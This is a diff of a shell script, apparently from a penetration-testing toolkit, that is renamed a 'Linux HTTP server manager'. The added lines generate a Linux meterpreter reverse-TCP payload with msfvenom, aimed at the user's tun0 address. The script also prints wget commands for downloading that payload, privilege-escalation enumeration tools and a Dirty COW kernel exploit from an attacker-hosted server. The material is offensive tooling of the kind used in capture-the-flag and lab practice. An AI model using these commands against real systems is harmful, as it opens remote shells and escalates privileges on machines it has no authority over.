@@ -2,15 +2,23 @@
 # coding:UTF-8
 
 # -------------------------------------------------------------------------------------
-#                      Windows Powershell Reverse Shell Script
+#                            LINUX HTTP SERVER MANAGER
 #                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
 # -------------------------------------------------------------------------------------
+
+ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
+filename="file.txt"
+
+while read line
+  do
+  msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$line LPORT=6666 -f exe -o linpayload.elf
+done < $filename
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : 2.0                                                                
-# Details : Display the universal banner.
+# Details : Display my universal banner.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
@@ -25,31 +33,22 @@ echo "\t\t                                                                      
 echo "\t\t                   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                      "
 echo "\n"
 
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : 2.0                                                                
-# Details : Describe the current system and user information.
-# Modified: N/A                                                               
-# -------------------------------------------------------------------------------------
-
-ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
-
 echo "Startup Instructions:"
 echo "\n"
+echo "If required:"
+echo "wget \"http://$line:8000/linpayload.elf\"\n\nOtherwise:"
 
-filename="file.txt"
 while read line
   do
-  echo "wget http://$line:8000/SH/LinEnum.sh"
-  echo "wget http://$line:8000/SH/LinEnumPlus.sh"
-  echo "wget http://$line:8000/SH/LinPe.sh"
-  echo "wget http://$line:8000/ELF/pspy32"
-  echo "wget http://$line:8000/ELF/pspy64"
+  echo "wget \"http://$line:8000/SH/LinEnum.sh\""
+  echo "wget \"http://$line:8000/SH/LinEnumPlus.sh\""
+  echo "wget \"http://$line:8000/SH/LinPe.sh\""
+  echo "wget \"http://$line:8000/ELF/pspy32\""
+  echo "wget \"http://$line:8000/ELF/pspy64\""
   
   echo "\nKernel Exploits:"
-  echo "wget http://$line:8000/KERNALS/NaughtyCowCompile.sh"
-  echo "wget http://$line:8000/KERNALS/NaughthyCow.c"
+  echo "wget \"http://$line:8000/KERNALS/NaughtyCowCompile.sh\""
+  echo "wget \"http://$line:8000/KERNALS/NaughthyCow.c\""
 done < $filename
 
 echo ""
